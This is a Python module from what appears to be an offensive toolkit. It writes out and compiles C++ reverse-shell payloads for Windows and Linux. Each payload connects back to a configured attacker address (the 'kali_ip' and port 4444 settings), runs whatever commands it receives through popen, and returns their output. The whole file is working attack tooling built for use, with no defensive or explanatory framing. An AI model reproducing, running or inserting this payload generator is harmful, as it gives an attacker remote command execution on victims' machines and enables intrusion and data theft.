import os
import shutil
import subprocess
import tempfile

from core.logger import Logger
from core.module_interface import ModuleInterface

logger = Logger()


class CppPayloadGenerator(ModuleInterface):
    def get_metadata(self):
        return {"name": "C++ Reverse Shell Payload", "version": "2.1", "type": "generator"}

    def run(self, config):
        lhost = config.get("kali_ip", "127.0.0.1")
        lport = config.get("kali_port", 4444)

        compilers = ["x86_64-w64-mingw32-g++", "i686-w64-mingw32-g++", "g++", "clang++"]
        compiler = next((c for c in compilers if shutil.which(c)), None)
        if not compiler:
            logger.error("Aucun compilateur C++ trouvé")
            return {"status": "error", "message": "No C++ compiler found"}

        is_windows_target = compiler.startswith("x86_64-w64") or compiler.startswith("i686-w64") or "mingw" in compiler

        if is_windows_target:
            cpp_code = f'''
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#pragma comment(lib, "ws2_32.lib")

void RunShell(const char* host, int port) {{
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) return;
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {{ WSACleanup(); return; }}
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(host);
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {{
        closesocket(sock);
        WSACleanup();
        return;
    }}
    char buffer[4096];
    while (1) {{
        int recvd = recv(sock, buffer, sizeof(buffer)-1, 0);
        if (recvd <= 0) break;
        buffer[recvd] = '\\0';
        FILE* pipe = _popen(buffer, "r");
        if (pipe) {{
            while (fgets(buffer, sizeof(buffer), pipe)) {{
                send(sock, buffer, strlen(buffer), 0);
            }}
            _pclose(pipe);
        }}
    }}
    closesocket(sock);
    WSACleanup();
}}

int main() {{
    RunShell("{lhost}", {lport});
    return 0;
}}
'''
            out_exe = "payload_cpp.exe"
            compile_cmd = [compiler, "-o", out_exe, "-"]
        else:
            cpp_code = f'''
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>

int main() {{
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return 1;

    sockaddr_in server {{}};
    server.sin_family = AF_INET;
    server.sin_port = htons({lport});
    inet_pton(AF_INET, "{lhost}", &server.sin_addr);

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {{
        close(sock);
        return 1;
    }}

    char buffer[4096];
    while (true) {{
        ssize_t n = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (n <= 0) break;
        buffer[n] = '\\0';
        FILE* pipe = popen(buffer, "r");
        if (pipe) {{
            char output[4096];
            while (fgets(output, sizeof(output), pipe) != nullptr) {{
                send(sock, output, strlen(output), 0);
            }}
            pclose(pipe);
        }}
    }}

    close(sock);
    return 0;
}}
'''
            out_exe = "payload_cpp"
            compile_cmd = [compiler, "-o", out_exe, "-"]

        cpp_path = None
        try:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.cpp', delete=False, encoding='utf-8') as f:
                f.write(cpp_code)
                cpp_path = f.name

            compile_cmd = [compiler, "-o", out_exe, cpp_path]
            proc = subprocess.run(compile_cmd, capture_output=True, text=True, check=False)
            if proc.returncode != 0:
                raise RuntimeError(proc.stderr or proc.stdout or "Unknown compilation error")

            target = os.path.join(os.getcwd(), out_exe)
            if os.path.exists(out_exe):
                shutil.move(out_exe, target)
            else:
                target = os.path.abspath(cpp_path).replace('.cpp', '')

            logger.info("Payload C++ généré", output=target)
            return {"status": "success", "payload_path": target, "type": "cpp"}
        except Exception as e:
            logger.error("Compilation échouée", error=str(e))
            return {"status": "error", "message": str(e)}
        finally:
            if cpp_path and os.path.exists(cpp_path):
                os.unlink(cpp_path)


__all__ = ["CppPayloadGenerator"]